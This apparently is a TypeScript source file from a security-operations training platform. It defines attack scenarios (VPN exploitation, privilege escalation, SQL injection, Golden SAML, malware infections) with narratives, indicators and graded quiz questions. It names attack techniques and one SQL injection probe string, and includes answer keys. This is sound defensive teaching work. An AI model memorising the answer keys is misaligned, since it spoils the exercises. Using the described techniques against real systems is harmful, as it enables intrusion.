  { slug: "edge-vpn-cve-exploit",
    title: "Edge Appliance Exploitation — FortiOS SSL-VPN Auth Bypass to Internal Foothold",
    difficulty: "advanced", attack_kind: "exploit_public_facing",
    threat_actor: "Opportunistic access broker (mass edge-appliance exploitation)", build: withAlerts(buildEdgeVpnCveExploitScenario),
    summary: "The FortiGate SSL-VPN appliance's own IPS fires CVE-2022-40684 and its event log records admin access as Local_Process_Access, then a new rogue admin. An hour later a 'valid' VPN login's tunnel IP turns up as a 4624 on an internal jump host, then a SAM dump and SMB reach. The initial access is the appliance itself." },
  { slug: "exfil-first-extortion",
    title: "Exfiltration-First Extortion — Ransomware Without an Encryptor",
    difficulty: "advanced", attack_kind: "exfiltration",
    threat_actor: "Exfiltration-only extortion crew (BianLian/Karakurt-style — no encryptor deployed)", build: withAlerts(buildExfilFirstExtortionScenario),
    summary: "Mass file reads, a 7-Zip archive, and a sustained upload to a cloud-storage host — then a demand. Nothing is encrypted and no ransom note lands on disk, which is exactly why grading this by 'what did they break' misses that it is a ransomware-class incident." },

  // ── P1 use-case expansion (scenario-usecase-map: privilege escalation ×2, lateral movement, insider DLP, NAC) ──
  { slug: "windows-privesc-token",
    title: "SYSTEM in Twelve Seconds — Token Impersonation on an IIS Host",
    difficulty: "intermediate", attack_kind: "windows_privilege_escalation",
    threat_actor: "Post-exploitation operator on a compromised web-app service account", build: withAlerts(buildWindowsPrivescTokenScenario),
    summary: "A non-admin IIS service account holds SeImpersonatePrivilege — and turns it into a SYSTEM shell via a named-pipe potato attack, then dumps the local SAM. The loud SAM export is downstream; the quiet 4672 is where it began." },
  { slug: "linux-privesc-suid",
    title: "www-data to Root — SUID find on an Ubuntu App Server",
    difficulty: "intermediate", attack_kind: "linux_privilege_escalation",
    threat_actor: "Opportunistic intruder operating a www-data web-shell foothold", build: withAlerts(buildLinuxPrivescSuidScenario),
    summary: "A www-data foothold escalates to root by abusing a setuid /usr/bin/find (GTFOBins), reads /etc/shadow, and plants a uid-0 backdoor account — proven from auditd uid/euid/auid and a Falcon privilege-escalation detection." },
  { slug: "lateral-movement-pth",
    title: "Pass-the-Hash to the File Server, Second Hop to the DC",
    difficulty: "intermediate", attack_kind: "lateral_movement",
    threat_actor: "Hands-on-keyboard intrusion operator (post-foothold, credential-replay)", build: withAlerts(buildLateralMovementPthScenario),
    summary: "An operator replays a stolen NTLM hash to log into a file server without a password, installs a remote service PsExec-style, and hops to a Domain Controller — learn to tell a pass-the-hash 4624 from a legitimate network logon." },
  { slug: "insider-dlp-usb-cloud",
    title: "Last Week on the Job — Insider Exfil via USB and Personal Cloud",
    difficulty: "intermediate", attack_kind: "insider_data_theft",
    threat_actor: "Malicious insider (departing employee, valid account — no external actor)", build: withAlerts(buildInsiderDlpUsbCloudScenario),
    summary: "A departing Senior Financial Analyst copies labeled client data to a personal USB stick and uploads it to consumer Dropbox — every action allowed under his own account because Purview DLP is in Audit mode. Reach the verdict from audit-only DLP + HR context, not from any control that blocked." },
  { slug: "nac-rogue-device",
    title: "The Printer That Wasn't — Rogue Device Caught by NAC",
    difficulty: "beginner", attack_kind: "rogue_device",
    threat_actor: "Unauthorized insider / unmanaged device (physical network access)", build: withAlerts(buildNacRogueDeviceScenario),
    summary: "A rogue Windows laptop spoofs an HP printer's MAC to bypass MAB onto the corporate LAN; Cisco ISE profiling catches the OUI/fingerprint mismatch, posture fails, and NAC quarantines the port." },

  // ── P2 use-case expansion (scenario-usecase-map: macOS, DB-layer, Azure-native, CI/CD, UEBA, social-eng, PAM) ──
  { slug: "macos-stealer-dmg",
    title: "macOS Stealer — a 'Cracked' App DMG Harvests Keychain, Cookies and Wallets",
    difficulty: "intermediate", attack_kind: "macos_infostealer",
    threat_actor: "Commodity macOS infostealer operator (Atomic/AMOS-family), distributing via pirated-app disk images", build: withAlerts(buildMacosStealerDmgScenario),
    summary: "A pirated-app DMG carries an Atomic/AMOS-family stealer: it mounts, phishes the user's macOS password through a fake osascript dialog, then reads the login Keychain, browser cookies and a crypto wallet before zipping it all to an external host. A signed, notarized install of the same shape is the benign control — the malice is the source, not the file type." },
  { slug: "sqli-db-exfil",
    title: "SQL Injection to Database Exfiltration — Following the Attack Past the WAF",
    difficulty: "advanced", attack_kind: "sql_injection",
    threat_actor: "External web attacker automating SQL injection against a public storefront", build: withAlerts(buildSqliDbExfilScenario),
    summary: "The WAF blocks the obvious ' OR 1=1 probe but the UNION and error-based payloads sail through a detection-mode rule — and the database audit shows what the WAF alert alone cannot: schema enumeration, a 248k-row PII dump, and xp_cmdshell OS execution. Learn to follow the injection past the perimeter into the DB where the data actually left." },
  { slug: "azure-managed-identity-abuse",
    title: "Azure App-Registration Credential Abuse — the Quiet Secret-Add Behind a Cloud Data-Access Alert",
    difficulty: "advanced", attack_kind: "cloud_privilege_escalation",
    threat_actor: "Cloud intrusion operator abusing a compromised workload identity (post-foothold)", build: withAlerts(buildAzureManagedIdentityAbuseScenario),
    summary: "An attacker appends a new client secret to an over-permissioned Entra app registration, then authenticates non-interactively to Graph and ARM to enumerate the subscription, grant itself a role, and read Key Vault secrets and Storage keys. The loud data-access alert traces back to one quiet 'Add service principal credentials' audit line — a legitimate Terraform rotation is the benign look-alike." },
  { slug: "cicd-supply-chain",
    title: "Poisoned Pipeline — CI/CD Supply-Chain Compromise into the Cloud",
    difficulty: "advanced", attack_kind: "supply_chain",
    threat_actor: "Intrusion operator abusing a compromised repository maintainer account", build: withAlerts(buildCicdSupplyChainScenario),
    summary: "A compromised maintainer mints a PAT, registers an attacker-controlled self-hosted runner, and pushes a workflow change through a branch-protection override — then the run trades its GitHub OIDC token for an AWS deploy role and reads S3 and Secrets Manager from outside AWS, which is what GuardDuty finally catches. An approved PR editing the same workflow is the benign control." },
  { slug: "ueba-compromised-account",
    title: "Behavioral Risk First — a UEBA-led Account-Compromise Hunt",
    difficulty: "intermediate", attack_kind: "account_compromise",
    threat_actor: "External actor operating a stolen session (cloud identity takeover — no host foothold)", build: withAlerts(buildUebaCompromisedAccountScenario),
    summary: "The investigation starts not from a signature alert but from a Sentinel UEBA risk score: impossible travel, a mass SharePoint download, and a new inbox-forwarding rule on one entity. Pivot from the anomaly into the Entra sign-in and O365 audit to confirm a real token-replay compromise — and contrast it with a benign impossible-travel anomaly (corporate VPN, approved travel) that scores high but is not an attack." },
  { slug: "vishing-rmm",
    title: "Callback Vishing — RMM Install to Hands-on-Keyboard Discovery",
    difficulty: "intermediate", attack_kind: "social_engineering",
    threat_actor: "Voice-phishing initial-access operator (help-desk impersonation, RMM-enabled)", build: withAlerts(buildVishingRmmScenario),
    summary: "A caller posing as IT security talks a payments clerk into installing signed, legitimate AnyDesk, then runs AD discovery hands-on-keyboard. The binary is trusted and the signature is valid — the signal is the context: an unsolicited install right after an inbound call, an RMM the bank does not deploy. A sanctioned ScreenConnect support session is the benign control of the identical shape." },
  { slug: "pam-vault-abuse",
    title: "PAM Vault Abuse — an Off-Hours Domain-Admin Checkout Used Outside PSM",
    difficulty: "advanced", attack_kind: "privileged_access_abuse",
    threat_actor: "Credential-abusing operator misusing a PAM-vaulted domain-admin account (insider or account takeover)", build: withAlerts(buildPamVaultAbuseScenario),
    summary: "A CyberArk-vaulted domain-admin credential is retrieved off-hours with no dual-control and no change record, then replayed straight into servers — bypassing the monitored PSM proxy that policy requires. A privileged logon alone looks normal; the tell is the checkout record plus the credential used outside PSM. An approved break-glass checkout of the same account is the benign control." },

  // ── P3 use-case expansion (scenario-usecase-map: wiper, S3 exfil, Golden SAML, GWS OAuth, threat-intel hunt, container escape) ──
  { slug: "destructive-wiper",
    title: "Destructive Wiper — an Endpoint Bricked, and No Way to Pay for It Back",
    difficulty: "advanced", attack_kind: "destructive_attack",
    threat_actor: "Destructive intrusion operator (data-destruction objective, wiper deployed via a compromised admin)", build: withAlerts(buildDestructiveWiperScenario),
    summary: "It looks ransomware-adjacent — mass file overwrites, shadow copies deleted, recovery disabled, event logs cleared — but there is no ransom note, no key, and no decryptor C2, because the goal is destruction, not extortion. Learn to tell a wiper from ransomware by the absence of any recovery path, and why the response is rebuild-from-backup rather than negotiate. A change-ticketed IT secure-wipe is the benign control." },
  { slug: "s3-exfil-exposure",
    title: "Exposed Bucket — S3 Made Public, Then Emptied",
    difficulty: "intermediate", attack_kind: "cloud_data_exfiltration",
    threat_actor: "Operator abusing a leaked, over-permissioned IAM access key", build: withAlerts(buildS3ExfilExposureScenario),
    summary: "A leaked IAM key disables Block Public Access and rewrites the bucket policy to public, then bulk-downloads tens of thousands of objects — and GuardDuty raises anonymous-access and exfiltration findings. The config-change management events are the origin; the GetObject burst from an internet address is the blast radius. A backup service role reading the same bucket from inside AWS is the benign control." },
  { slug: "golden-saml",
    title: "Golden SAML — a Federation Token With No Matching AD FS Issuance",
    difficulty: "expert", attack_kind: "federation_abuse",
    threat_actor: "Nation-state-style intrusion set abusing a compromised federation server (SolarWinds / APT29 TTP)", build: withAlerts(buildGoldenSamlScenario),
    summary: "An attacker who owns the AD FS server steals the token-signing key and mints SAML assertions for privileged users straight to the cloud — no real logon at the identity provider. The defining tell is an absence: a federated sign-in accepted by Entra with no matching AD FS token-issuance event on-prem, and MFA satisfied by a claim already inside the token. A legitimate federated sign-in that does have its issuance record is the benign control." },
  { slug: "gws-oauth-marketplace",
    title: "Consent, Not Credentials — a Malicious OAuth App in Google Workspace",
    difficulty: "intermediate", attack_kind: "oauth_abuse",
    threat_actor: "Consent-phishing operator abusing a third-party OAuth app (cloud identity, no host foothold)", build: withAlerts(buildGwsOauthMarketplaceScenario),
    summary: "A user is phished into authorizing a broad-scope OAuth app; the consent issues an offline refresh token that reads their mailbox and exfiltrates Drive over the API — no password, MFA irrelevant, and it survives the password reset the help desk tries. The consent grant is the persistence; the API access is the impact. A narrow-scope, admin-allowlisted app the user consents to normally is the benign control." },
  { slug: "threat-intel-hunt",
    title: "Threat-Intel Hunt — From a Recorded Future IOC Set to a Live Beacon",
    difficulty: "intermediate", attack_kind: "threat_hunt",
    threat_actor: "GLASSTHORN intrusion set (TEMP.Halberd) — SystemBC proxy-implant operator", build: withAlerts(buildThreatIntelHuntScenario),
    summary: "This case opens with intelligence, not an alert: a Recorded Future risk-list update names a C2 domain, an IP and a malware hash tied to an active campaign. Sweep the estate and one workstation lights up — DNS to the C2, periodic proxy beacons, and the exact hash running on the host. Learn intel→sweep→confirm, and why a second host that matched a now-sinkholed indicator is a false hit, not a compromise." },

  // ── P4 use-case expansion (scenario-usecase-map Part 5: mobile/MDM, GCP-native, macOS TCC, email-bomb social-eng, OT/ICS, BEC wire fraud) ──
  { slug: "mobile-mdm-compromise",
    title: "Mobile in the Blind Spot — an Intune-Managed Phone Goes Rogue",
    difficulty: "intermediate", attack_kind: "mobile_compromise",
    threat_actor: "Mobile-phishing operator (smishing-led device takeover, no host foothold)", build: withAlerts(buildMobileMdmCompromiseScenario),
    summary: "A smishing link leads to a sideloaded app and a rooted device; Intune's mobile-threat signal fires and the device flips non-compliant, yet corporate mail and files are still reached because the Entra sign-in shows a Conditional-Access gap — a non-compliant device getting success. The analyst reaches the verdict from Intune compliance + Entra sign-ins, not a host process tree. A phone that briefly went non-compliant for a pending OS update is the benign control." },
  { slug: "gcp-sa-key-theft",
    title: "Minted Key — Service-Account Key Theft on GCP",
    difficulty: "advanced", attack_kind: "cloud_credential_theft",
    threat_actor: "Operator abusing a compromised developer identity to key an over-permissioned GCP service account", build: withAlerts(buildGcpSaKeyTheftScenario),
    summary: "A compromised developer identity mints a long-lived user-managed key on an over-permissioned service account, then the acting principal switches to that SA to read the datalake and Secret Manager — all from an external IP. The quiet CreateServiceAccountKey admin-activity line is the pivot; the data reads are the blast radius. A Terraform CI service account creating a key from inside the pipeline is the benign control." },
  { slug: "macos-tcc-pkg",
    title: "macOS TCC Bypass — a Fake .pkg Rewrites the Privacy Database and Persists as a LaunchDaemon",
    difficulty: "intermediate", attack_kind: "macos_tcc_bypass",
    threat_actor: "macOS intrusion operator distributing a trojanized installer package (fake productivity/meeting app)", build: withAlerts(buildMacosTccPkgScenario),
    summary: "A fake meeting-app installer package runs a root postinstall script that rewrites the TCC privacy database to grant itself Full Disk Access and Screen Recording, then installs a LaunchDaemon for boot persistence and reads protected user data. The tells are the root install-script, the TCC.db manipulation and the daemon that survives reboot. A notarized, validly-signed .pkg with a normal per-user LaunchAgent is the benign control." },
  { slug: "email-bomb-helpdesk",
    title: "Email Bomb to Fake Help Desk — Quick Assist Takeover",
    difficulty: "intermediate", attack_kind: "email_bomb_social_eng",
    threat_actor: "Social-engineering intrusion operator (mail-flood pretext, help-desk impersonation)", build: withAlerts(buildEmailBombHelpdeskScenario),
    summary: "Hundreds of individually-clean newsletter confirmations flood a mailbox in minutes; then a caller posing as IT offers to 'help stop the spam' and talks the overwhelmed user into launching Microsoft's own signed Quick Assist, and hands-on-keyboard discovery follows. The flood is the opening move, not the attack — a signed remote tool is not the signal, the unsolicited context is. A sanctioned Quick Assist session on a real ticket is the benign control. (Black Basta TTP.)" },
  { slug: "ot-network-anomaly",
    title: "OT/ICS Intrusion — A Corporate Host Writes to a PLC (Network-Only Visibility)",
    difficulty: "advanced", attack_kind: "ot_ics_intrusion",
    threat_actor: "IT-to-OT pivot operator issuing industrial-protocol commands from a corporate foothold", build: withAlerts(buildOtNetworkAnomalyScenario),
    summary: "Seen only through passive network sensors (Zeek + Suricata) at the IT/OT boundary: a corporate-VLAN host starts speaking Modbus to production PLCs it never contacts, sweeps the controller range, and issues write function codes to a line controller. The discriminator is source identity + a Modbus WRITE from an unauthorized host versus the engineering station's normal read polling — the benign control on the same protocol, port and PLCs." },
  { slug: "bec-wire-fraud",
    title: "The CFO Who Never Called — a BEC Wire-Fraud Impersonation",
    difficulty: "intermediate", attack_kind: "bec_wire_fraud",
    threat_actor: "Business email compromise operator (external executive impersonation, no host or mailbox foothold)", build: withAlerts(buildBecWireFraudScenario),
    summary: "An urgent wire request appears to come from the CFO — a lookalike-domain email with a display-name spoof that fails SPF/DKIM/DMARC, reinforced by a deepfake voice-clone phone call. The teaching point is that this is impersonation, not a mailbox takeover: the real CFO account is untouched. The verdict comes from email authentication + the lookalike domain, not from any compromised internal account. A genuine CFO payment email that passes auth is the benign control." },
] as const;

// ─── Impossible Travel — Account Compromise via Stolen Credentials ────────────

export function buildImpossibleTravelScenario(scenarioId = "impossible-travel-2026"): ScenarioBundle {
  const { title, events, T, MIN, nigIp } = impossibleTravelScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",    value: nigIp,                               reputation: "malicious", tags: ["attacker-ip", "MTN Nigeria", "Lagos"] },
    { type: "email", value: "collector.k.taylor@protonmail.com", reputation: "malicious", tags: ["attacker-email", "inbox-forward-target"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "External Threat Actor (Credential Theft)",
    attack_kind: "account_compromise",
    briefing: "Entra ID Protection raised a high-risk, unlikely-travel sign-in on k.taylor at 09:06, minutes after the VPN logged a second session for the same account from a new country. A burst of failed sign-ins preceded it. The user has not been contacted yet.",
    narrative: `A password-spray burst from a Nigerian IP ended in a successful sign-in to k.taylor's account. At 09:00 k.taylor connected to the VPN normally from Tel Aviv; four minutes later the same account connected from Lagos, Nigeria — 4,320 km away, physically impossible. The VPN sign-in went through Entra with a single factor (no MFA), Entra ID Protection rated the O365 sign-in high risk (unlikely travel), and the attacker then created a hidden inbox forwarding rule to a ProtonMail address, used the VPN tunnel to reach the engineering file server over SMB, and downloaded 847 SharePoint files (2.3 GB). The failed-login origin, the shared Entra session id and the tunnel IP tie the chain together.`,
    learning_objectives: [
      "Recognize impossible travel as a credential compromise indicator",
      "Identify a single-factor VPN sign-in (no MFA) as the gap that let the stolen password work",
      "Detect hidden inbox forwarding rules (T1114.003)",
      "Correlate the credential-origin spray, VPN, Entra risk, VPN-tunnel SMB traffic, and SharePoint download into one chain",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-28 * MIN), phase: "Credential Access", action: "Password-spray burst from a Nigerian IP ends in a valid password for k.taylor" },
      { ts: T(0),        phase: "Normal Baseline",  action: "k.taylor VPN login from Tel Aviv — looks normal" },
      { ts: T(4 * MIN),  phase: "Impossible Travel", action: "Same user VPN login from Lagos, Nigeria — 4 min later, 4,320 km away" },
      { ts: T(4 * MIN + 20_000), phase: "Defense Evasion", action: "VPN app sign-in through Entra with a single factor — no MFA" },
      { ts: T(6 * MIN),  phase: "Detection",        action: "Entra ID Protection flags the O365 sign-in high risk (unlikely travel)" },
      { ts: T(9 * MIN),  phase: "Email Persistence", action: "Inbox forwarding rule created: all mail → protonmail attacker address" },
      { ts: T(11 * MIN), phase: "Lateral Movement",  action: "VPN tunnel IP opens an SMB session to the engineering file server" },
      { ts: T(14 * MIN), phase: "Data Collection",   action: "847 SharePoint files (2.3 GB) downloaded in 5 minutes" },
    ],
    questions: [
      { id: "q1", prompt: "What is the key indicator that proves this is a compromised credential rather than k.taylor traveling?", kind: "single",
        options: [
          { value: "distance", label: "4,320 km between Tel Aviv and Lagos in 4 minutes — physically impossible travel" },
          { value: "time",     label: "The Lagos sign-in happened in the middle of the night for k.taylor's usual time zone" },
          { value: "vpn",      label: "The second VPN login terminated on a different GlobalProtect gateway than the first" },
          { value: "device",   label: "The device hostname on the second login differs from k.taylor's usual laptop" },
        ],
        answer: "distance", xp: 50,
        explanation: "The 4-minute gap between logins from cities 4,320 km apart is physically impossible — no aircraft travels at 64,800 km/h. This is the definitive indicator of impossible travel, not timing or device differences. Distance-to-time ratio is the core of impossible travel detection." },
      { id: "q2", prompt: "What field in the VPN logs most directly proves credential theft (not a legitimate VPN split-tunnel or proxy)?", kind: "single",
        options: [
          { value: "ip",       label: "The source IP is from a Nigerian ISP (MTN Nigeria)" },
          { value: "device",   label: "gp.device_registered: false — unrecognized device" },
          { value: "mfa",      label: "MFA was not challenged for the Nigerian login" },
          { value: "country",  label: "The GeoLocation country_name field shows Nigeria" },
        ],
        answer: "device", xp: 75,
        explanation: "An unregistered device (gp.device_registered: false) proves the login came from hardware the organization never enrolled — eliminating VPN split-tunnel and corporate proxy scenarios. A registered corporate device behind a Nigerian exit node would still show gp.device_registered: true. The Nigerian IP alone could be a VPN exit node used by a traveling employee." },
      { id: "q3", prompt: "After confirming impossible travel, what is the FIRST containment action?", kind: "single",
        options: [
          { value: "block_ip",  label: "Block the Nigerian source IP at the perimeter firewall" },
          { value: "revoke",    label: "Revoke all active sessions, then reset the password" },
          { value: "notify",    label: "Email k.taylor to confirm whether they are in Nigeria" },
          { value: "monitor",   label: "Keep monitoring the session to gather more evidence" },
        ],
        answer: "revoke", xp: 50,
        explanation: "Revoking all active sessions immediately terminates the attacker's access even while evidence-gathering continues. Blocking the IP fails if the attacker switches exit nodes. Notifying the user wastes precious minutes while SharePoint files are being downloaded. Continued monitoring without action allows the exfiltration to complete." },
      { id: "q4", prompt: "The attacker downloaded 847 SharePoint files (2.3 GB) in 5 minutes. Which log source would provide the most forensically complete list of exactly which files were accessed?", kind: "single",
        options: [
          { value: "o365",      label: "O365 Unified Audit Log (SharePoint FileDownloaded operations)" },
          { value: "vpn",       label: "GlobalProtect VPN session logs (bytes transferred per session)" },
          { value: "dlp",       label: "Microsoft Purview DLP alerts (FileDownloaded policy matches)" },
          { value: "firewall",  label: "Perimeter firewall egress logs (bytes out to the attacker's IP)" },
        ],
        answer: "o365", xp: 75,
        explanation: "The O365 Unified Audit Log records each individual FileDownloaded operation with the exact file path, site URL, and timestamp. VPN logs show total session bytes but cannot identify individual files. DLP may not have triggered if no sensitive data policies matched. Firewall egress shows volume but not file identity." },
    ],
  };
}

// =========================================================================
// Foundation Scenario A: Phishing Attachment → Malware Execution → Workstation Compromise
// The simplest possible attack in the platform — one host, one user, no
// lateral movement, no credential theft, no cloud pivot. This is the story a
// student who is brand-new to SOC work should see first: an everyday
// phishing email leads to a malware infection, and the EDR eventually
// catches it. Nothing here requires knowing Kerberos, cloud IAM, or AD.
// =========================================================================

export function buildPhishingMalwareScenario(scenarioId = "phishing-malware-basic-2026"): ScenarioBundle {
  const { title, events, T, MIN, c2Domain, c2Ip, fileHash, zipHash } = phishingMalwareScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure", "newly-registered-domain"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "sha256", value: fileHash, reputation: "malicious", tags: ["commodity-trojan", "double-extension"] },
    { type: "sha256", value: zipHash,  reputation: "malicious", tags: ["email-attachment", "zip-container"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "phishing_malware_basic",
    briefing: "The firewall's URL filtering alerted at 10:21 on a session from WS-HR-1182 (r.avraham) to a newly registered domain, and the EDR quarantined a file on the same host at 10:24. The mail gateway logged an inbound attachment to the same user earlier this morning. Confirm what ran on the host.",
    narrative: `r.avraham received a phishing email disguised as a shipping notification, with a ZIP attachment hiding a trojan behind a double file extension (.pdf.exe). Outlook saved the ZIP (same SHA256 as the attachment record), Explorer extracted the .pdf.exe, and when it ran it connected to a newly registered domain. The EDR killed and quarantined it three minutes later, and ZAP then pulled the message from the inbox — but the workstation was infected from the moment the process ran.`,
    learning_objectives: [
      "Recognize a phishing email with a disguised executable attachment (T1566.001)",
      "Identify user execution of a double-extension file as the actual infection point (T1204.002)",
      "Understand that a firewall ALLOW on a brand-new domain is not the same as safe — young domains are a strong indicator",
      "See how EDR detection can lag behind execution — the workstation is compromised the moment the process runs, not when it's caught",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),               phase: "Initial Access",  action: "Phishing email with ZIP attachment delivered to r.avraham" },
      { ts: T(5 * MIN + 20_000), phase: "Delivery",      action: "Outlook saves the ZIP to Downloads; Explorer extracts the .pdf.exe" },
      { ts: T(6 * MIN),         phase: "Execution",       action: "r.avraham double-clicks the disguised .pdf.exe — malware runs" },
      { ts: T(6 * MIN + 45_000), phase: "Command & Control", action: "The process connects to a newly registered domain; URL filtering alerts but allows it" },
      { ts: T(9 * MIN),         phase: "Detection",       action: "EDR kills the process and quarantines the file" },
      { ts: T(11 * MIN),        phase: "Response",        action: "ZAP moves the message to quarantine" },
    ],
    questions: [
      { id: "q1", prompt: "What is the single clearest sign that Delivery_Notice_48213.pdf.exe is not really a PDF?", kind: "single",
        options: [
          { value: "size",  label: "The archive is only 18KB, far too small for a real shipping document" },
          { value: "ext",   label: "The real file extension is .exe, hidden behind a fake .pdf in the name" },
          { value: "email", label: "The email arrived from an external sender outside the organization's mail domain" },
          { value: "user",  label: "r.avraham works in HR and has no business reason to receive a shipping notice" },
        ],
        answer: "ext", xp: 40,
        explanation: "A double extension like .pdf.exe is a classic disguise — Windows only looks at the LAST extension (.exe) to decide how to run the file, but a distracted user only sees '.pdf' at a glance. The file size and sender being external are supporting context, not the direct proof." },
      { id: "q2", prompt: "The firewall ALLOWED the connection to shiptrack-updates-net.xyz. Does that mean the connection was safe?", kind: "single",
        options: [
          { value: "yes", label: "Yes — the firewall returned action=allow, which means the destination passed its threat and URL filtering checks" },
          { value: "no",  label: "No — 'allowed' just means it wasn't on a blocklist yet; a domain the firewall categorises as newly registered is itself suspicious" },
        ],
        answer: "no", xp: 50,
        explanation: "Firewalls default to allow unless a domain is already known-bad. A newly registered domain (PAN-DB: registered within the last ~32 days) is a strong red flag on its own — legitimate business services are almost never that young. 'Allowed by the firewall' and 'safe' are not the same thing, and a SOC analyst has to evaluate the domain itself, not just the firewall verdict." },
      { id: "q3", prompt: "At what point was WS-HR-1182 actually compromised?", kind: "single",
        options: [
          { value: "email",   label: "When the phishing email landed in r.avraham's inbox" },
          { value: "execute", label: "When r.avraham double-clicked the .pdf.exe and it ran" },
          { value: "detect",  label: "When CrowdStrike raised its detection and quarantined the file" },
        ],
        answer: "execute", xp: 60,
        explanation: "Compromise happens at execution, not at delivery or at detection. The email sitting unopened in an inbox is not a compromise. The quarantine at the end is the response catching up to an infection that already happened minutes earlier — this is why 'the antivirus caught it eventually' is not the same as 'nothing bad happened.'" },
    ],
  };
}

// =========================================================================
// Foundation Scenario B: Malicious USB Drive → Trojan Persistence → Workstation Compromise
// Second beginner-tier scenario — different infection vector (physical media
// instead of email) so a student's first few sessions aren't all identical.
// Still one host, one user, EDR-only telemetry, no lateral movement.
// =========================================================================

export function buildUsbMalwareScenario(scenarioId = "usb-malware-basic-2026"): ScenarioBundle {
  const { title, events, T, MIN, fileHash, c2Domain, c2Ip } = usbMalwareScenarioEvents();

  const iocs: IOC[] = [
    { type: "sha256", value: fileHash, reputation: "malicious", tags: ["trojan-dropper", "removable-media"] },
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware / Opportunistic Physical Access",
    attack_kind: "usb_malware_basic",
    briefing: "The EDR quarantined a file on WS-OPS-2214 at 13:35. Removable-media activity and an outbound connection to an unfamiliar domain were logged on the same workstation shortly beforehand. The assigned user, m.levi, has not reported anything.",
    narrative: `An untagged USB drive was mounted on WS-OPS-2214 (its device serial is in the mount record), and USB_Backup_Tool.exe was copied off it to the Desktop. m.levi ran it, believing it to be a legitimate backup tool. The binary wrote a Registry Run key to survive reboots and connected to an external domain before the EDR killed and quarantined it — the drive serial, the file hash and the C2 domain/IP are all in the records, and persistence was already established.`,
    learning_objectives: [
      "Recognize removable media as an infection vector, separate from email or the network",
      "Identify user execution of an unsigned, never-before-seen binary (T1204.002)",
      "Understand Registry Run key persistence as a beginner-level but very common technique (T1547.001)",
      "See that 'quarantined' does not mean 'nothing happened' — persistence was already established",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-1 * MIN),         phase: "Initial Access", action: "Untagged USB drive mounted as E:\\ on WS-OPS-2214" },
      { ts: T(0),                phase: "Initial Access", action: "USB_Backup_Tool.exe copied from E:\\ to the Desktop" },
      { ts: T(3 * MIN),          phase: "Execution",      action: "m.levi double-clicks the unsigned binary — malware runs" },
      { ts: T(3 * MIN + 20_000), phase: "Persistence",    action: "Malware writes a Registry Run key to survive reboot" },
      { ts: T(3 * MIN + 50_000), phase: "Command & Control", action: "The binary connects out to an external domain" },
      { ts: T(5 * MIN),          phase: "Detection",      action: "EDR kills the process and quarantines the file" },
    ],
    questions: [
      { id: "q1", prompt: "What made this USB drive suspicious even before anything was executed?", kind: "single",
        options: [
          { value: "tag",  label: "It had no company asset tag and had never been seen on this host before" },
          { value: "size", label: "The copied file was only 240KB, far smaller than a genuine backup utility" },
          { value: "user", label: "m.levi works in Operations and has no documented need for a backup tool" },
        ],
        answer: "tag", xp: 40,
        explanation: "An unrecognized, untagged removable drive is itself a red flag in any environment with asset management — company-issued drives are known and tracked. File size and the user's department are not reliable indicators on their own." },
      { id: "q2", prompt: "Which single event in this chain represents the malware becoming PERSISTENT (surviving a reboot)?", kind: "single",
        options: [
          { value: "copy",    label: "USB_Backup_Tool.exe being copied from the USB drive to the Desktop" },
          { value: "execute", label: "m.levi double-clicking USB_Backup_Tool.exe, launched by explorer.exe" },
          { value: "persist", label: "The HKCU Run value SystemBackupSvc being written for the tool" },
        ],
        answer: "persist", xp: 50,
        explanation: "Copying and even running the file are one-time events — if the machine reboots before either happens again, the malware is gone. The Registry Run key is what makes the infection survive a reboot, which is the technical definition of persistence (T1547.001)." },
      { id: "q3", prompt: "The EDR shows 'action_result: quarantined' with a Critical severity. Is the incident fully resolved at that point?", kind: "single",
        options: [
          { value: "yes", label: "Yes — the EDR quarantined the binary before it could execute, so the threat is neutralized and no post-execution cleanup is required" },
          { value: "no",  label: "No — the malware ran and achieved persistence before being caught; the analyst must still check for other changes and document it" },
        ],
        answer: "no", xp: 60,
        explanation: "Quarantine stops the immediate threat, but it doesn't undo everything the malware did while it was running. A SOC analyst still needs to check for any other artifacts, confirm the Registry key was actually removed, and write up the incident — 'quarantined' is the start of cleanup, not the end of the investigation." },
    ],
  };
}

// =========================================================================
// Foundation Scenario C: Sideloaded Browser Extension → PowerShell Spawned by Chrome
// Third beginner-tier scenario — infection vector is a developer-mode browser
// extension, not email or physical media. Still one host, one user, EDR (+
// one firewall event for the outbound reach-out), no lateral movement.
// =========================================================================

export function buildBrowserExtensionMalwareScenario(scenarioId = "browser-extension-malware-2026"): ScenarioBundle {
  const { title, events, T, MIN, c2Domain, c2Ip, stagerHash, dlDomain, dlIp, zipHash } = browserExtensionMalwareScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure", "newly-registered-domain"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "domain", value: dlDomain, reputation: "malicious", tags: ["extension-lure-site"] },
    { type: "ip",     value: dlIp,     reputation: "malicious", tags: ["extension-lure-site"] },
    { type: "sha256", value: zipHash,  reputation: "malicious", tags: ["sideloaded-extension-zip"] },
    { type: "sha256", value: stagerHash, reputation: "malicious", tags: ["browser-extension-loader", "stage-2-script"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "browser_extension_malware_basic",
    briefing: "The EDR killed an encoded PowerShell process on WS-MKT-3301 (d.cohen) at 09:04, and the firewall logged an alert on an outbound connection from the same host to a newly registered domain minutes earlier. Reconstruct how a browser extension reached PowerShell.",
